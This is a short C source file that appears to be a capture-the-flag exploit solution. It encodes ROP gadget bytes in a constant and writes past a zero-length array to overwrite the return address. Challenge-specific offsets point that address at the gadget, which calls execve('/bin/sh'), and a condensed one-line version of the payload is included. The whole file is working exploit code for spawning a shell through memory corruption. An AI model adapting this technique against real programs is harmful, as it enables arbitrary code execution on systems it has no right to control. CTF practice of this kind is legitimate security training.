// one-liner:
// static char place; place += 1; static char* sh = "/bin/sh"; long long gadget = 0x050F5A5E5F3BB0; gadget = gadget; char * buf[0]; buf[0] = buf[0]; buf[2] = &place - 0x2eda; buf[3] = sh; buf[4] = 0; buf[5] = 0; return 0;

int main()
{
    // We want to call syscall(0x3b, "/bin/sh", NULL, NULL)
    // We can overwrite the return address to point to a ROP gadget.

    static char place;
    place += 1; // avoid unused variable

    static char *sh = "/bin/sh";

    // mov al, 0x3b
    // pop rdi
    // pop rsi
    // pop rdx
    // syscall
    long long gadget = 0x050F5A5E5F3BB0;
    gadget = gadget; // avoid unused variable

    char *buf[0];
    buf[0] = buf[0]; // avoid unused variable

    // For normal offset: 0x2eda
    // For revenge offset: 0x1ff2

    buf[2] = &place - 0x2eda; // adjust this offset to gadget
    buf[3] = sh;
    buf[4] = 0;
    buf[5] = 0;

    return 0;
}
